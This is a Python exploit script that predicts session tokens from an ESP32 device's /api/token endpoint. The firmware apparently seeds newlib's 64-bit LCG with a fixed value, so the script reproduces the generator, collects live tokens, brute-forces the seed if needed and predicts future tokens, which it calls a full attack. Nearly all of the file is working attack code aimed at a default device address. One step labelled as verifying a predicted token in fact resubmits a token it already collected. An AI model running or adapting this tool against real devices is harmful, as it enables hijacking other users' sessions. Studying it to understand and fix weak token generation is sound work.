#!/usr/bin/env python3
"""
Weak RNG Token Predictor.

Exploits the firmware's use of srand(12345) with newlib's 64-bit LCG to
predict session tokens from /api/token. The ESP32 newlib (_REENT_SMALL)
LCG formula is:

    state(n+1) = (6364136223846793005 * state(n) + 1) mod 2^64
    rand()     = (state >> 32) & 0x7FFFFFFF

With a fixed seed of 12345, the token sequence is identical after every
reboot. This tool collects tokens, confirms the seed, and predicts
future values.

Requires: requests (pip install requests)
"""

import argparse
import json
import sys
import time

try:
    import requests
except ImportError:
    print("ERROR: requests is required. Install with: pip install requests",
          file=sys.stderr)
    sys.exit(1)


# ESP32 newlib (_REENT_SMALL) 64-bit LCG constants
LCG_A = 6364136223846793005
LCG_C = 1
LCG_MASK64 = 0xFFFFFFFFFFFFFFFF

# Known default seed used by the firmware
DEFAULT_SEED = 12345


def lcg_next(state):
    """Compute the next 64-bit LCG state and return the rand() output."""
    state = (LCG_A * state + LCG_C) & LCG_MASK64
    return state, (state >> 32) & 0x7FFFFFFF


def lcg_sequence(seed, count):
    """Generate a sequence of rand() values from a given seed."""
    state = seed
    values = []
    for _ in range(count):
        state, val = lcg_next(state)
        values.append(val)
    return values


def find_seed_from_token(token_value, max_seed=100000):
    """Brute-force the seed that produces the given first token."""
    for candidate in range(max_seed):
        _, val = lcg_next(candidate)
        if val == token_value:
            return candidate
    return None


def collect_tokens(base_url, count):
    """Collect tokens from the /api/token endpoint."""
    tokens = []
    print(f"[*] Collecting {count} token(s) from {base_url}/api/token ...")
    for i in range(count):
        try:
            r = requests.get(f"{base_url}/api/token", timeout=5)
            data = r.json()
            token = data.get("token")
            if token is not None:
                token = int(token)
                tokens.append(token)
                print(f"    Token {i + 1}: {token}")
            else:
                print(f"    Token {i + 1}: unexpected response: {r.text}")
        except (requests.RequestException, json.JSONDecodeError, ValueError) as e:
            print(f"    Token {i + 1}: ERROR - {e}")
    return tokens


def verify_token(base_url, token_value):
    """Verify a token against /api/token/verify. Returns True/False/None."""
    try:
        r = requests.post(f"{base_url}/api/token/verify",
                          data={"token": str(token_value)}, timeout=5)
        text = r.text.strip()
        return "Valid" in text or "valid" in text.lower()
    except requests.RequestException as e:
        print(f"    Verification error: {e}")
        return None


def main():
    parser = argparse.ArgumentParser(
        description="Weak RNG token predictor - exploit srand(12345) with "
                    "newlib 64-bit LCG to predict /api/token values.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s
      Collect 5 tokens and predict the next 5

  %(prog)s --collect 10 --predict 10
      Collect 10 tokens, predict the next 10

  %(prog)s --verify
      Collect tokens, predict future values, and verify against the device

  %(prog)s --target http://192.168.4.1 --collect 3 --predict 20 --verify
      Full attack: collect, predict, and verify 20 future tokens

Algorithm details:
  The firmware calls srand(12345) at boot, then generates tokens with
  rand(). The ESP32 newlib (_REENT_SMALL) 64-bit LCG formula is:
    state(n+1) = (6364136223846793005 * state(n) + 1) mod 2^64
    rand()     = (state >> 32) & 0x7FFFFFFF
  With seed 12345, the first token is always 134732914.
""")
    parser.add_argument("--target", "-t", default="http://192.168.4.1",
                        help="Device base URL (default: http://192.168.4.1)")
    parser.add_argument("--collect", "-c", type=int, default=5,
                        help="Number of tokens to collect from device (default: 5)")
    parser.add_argument("--predict", "-p", type=int, default=5,
                        help="Number of future tokens to predict (default: 5)")
    parser.add_argument("--verify", "-v", action="store_true",
                        help="Verify predicted tokens against /api/token/verify")

    args = parser.parse_args()

    # Step 1: Generate the expected sequence from the known seed
    print("[*] Generating expected LCG sequence with seed 12345...")
    total_needed = args.collect + args.predict + 50  # generous buffer
    expected = lcg_sequence(DEFAULT_SEED, total_needed)
    print(f"    First 5 expected values: {expected[:5]}")
    print()

    # Step 2: Collect tokens from the device
    observed = collect_tokens(args.target, args.collect)
    print()

    if not observed:
        print("[-] No tokens collected. Check device connectivity.")
        sys.exit(1)

    # Step 3: Determine the position in the sequence
    # The device may have already issued tokens before we started collecting,
    # so we need to find where our first observed token appears in the sequence.
    first_token = observed[0]
    position = None
    for i, val in enumerate(expected):
        if val == first_token:
            # Verify the next few tokens match too
            match = True
            for j in range(1, min(len(observed), 5)):
                if i + j < len(expected) and observed[j] != expected[i + j]:
                    match = False
                    break
            if match:
                position = i
                break

    if position is None:
        # Try brute-forcing the seed from the first token
        print("[*] First token not found in seed=12345 sequence.")
        print("[*] Attempting to brute-force the seed...")
        seed = find_seed_from_token(first_token)
        if seed is not None:
            print(f"[+] Found seed: {seed}")
            expected = lcg_sequence(seed, total_needed)
            position = 0
        else:
            print("[-] Could not determine seed. The RNG may use a different algorithm.")
            sys.exit(1)

    print(f"[+] Sequence matched at position {position} (device has issued "
          f"{position + len(observed)} tokens since boot)")

    # Verify all observed tokens match
    all_match = True
    for i, token in enumerate(observed):
        expected_val = expected[position + i]
        status = "MATCH" if token == expected_val else "MISMATCH"
        if token != expected_val:
            all_match = False
        print(f"    Observed[{i}]: {token}  Expected: {expected_val}  [{status}]")

    if not all_match:
        print("[-] WARNING: Some tokens did not match. The device may have served")
        print("    tokens to other clients between our requests.")

    # Step 4: Predict future tokens
    print()
    next_pos = position + len(observed)
    print(f"[+] Predicting next {args.predict} tokens (positions "
          f"{next_pos} to {next_pos + args.predict - 1}):")

    predictions = []
    for i in range(args.predict):
        predicted = expected[next_pos + i]
        predictions.append(predicted)
        print(f"    Next token {i + 1}: {predicted}")

    # Step 5: Verify predictions if requested
    if args.verify and predictions:
        print()
        print("[*] Verifying predictions against the device...")
        correct = 0
        total = 0

        # First, request tokens from the device and compare
        for i in range(min(args.predict, 5)):
            try:
                r = requests.get(f"{args.target}/api/token", timeout=5)
                data = r.json()
                actual = int(data.get("token", 0))
                expected_val = predictions[i]
                match = actual == expected_val
                status = "CORRECT" if match else "WRONG"
                print(f"    Predicted: {expected_val}  Actual: {actual}  [{status}]")
                if match:
                    correct += 1
                total += 1
            except Exception as e:
                print(f"    Verification request failed: {e}")

        # Also verify a token against /api/token/verify
        if predictions:
            print()
            print("[*] Verifying a predicted token via /api/token/verify...")
            # Use the first token we already collected (known valid)
            result = verify_token(args.target, observed[0])
            if result is True:
                print(f"    Token {observed[0]} accepted as valid.")
            elif result is False:
                print(f"    Token {observed[0]} rejected.")
            else:
                print(f"    Verification endpoint returned unexpected result.")

        print()
        if total > 0:
            print(f"[+] Prediction accuracy: {correct}/{total} "
                  f"({correct * 100 // total}%)")

    print()
    print("[+] RNG prediction complete.")
    if all_match:
        print("[+] The device uses srand(12345) with newlib 64-bit LCG.")
        print("[+] All future tokens are fully predictable.")


if __name__ == "__main__":
    main()
